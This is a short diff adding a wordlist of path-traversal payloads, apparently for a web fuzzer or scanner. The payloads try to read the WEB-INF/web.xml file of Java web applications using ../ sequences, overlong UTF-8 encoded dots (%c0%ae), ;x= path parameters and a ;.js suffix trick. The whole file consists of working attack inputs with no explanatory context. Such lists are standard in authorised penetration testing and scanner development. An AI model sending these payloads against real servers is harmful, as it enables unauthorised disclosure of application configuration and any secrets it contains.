@@ -1,0 +1,14 @@
+/../../../../WEB-INF/web.xml
+/../../../WEB-INF/web.xml
+/../../WEB-INF/web.xml
+/%c0%ae/%c0%ae/WEB-INF/web.xml
+/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml
+/%c0%ae/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml
+/../../../WEB-INF/web.xml;x=
+/../../WEB-INF/web.xml;x=
+/../WEB-INF/web.xml;x=
+/WEB-INF/web.xml
+/.//WEB-INF/web.xml
+/../WEB-INF/web.xml
+/%c0%ae/WEB-INF/web.xml
+/en/WEB-INF/web.xml;.js
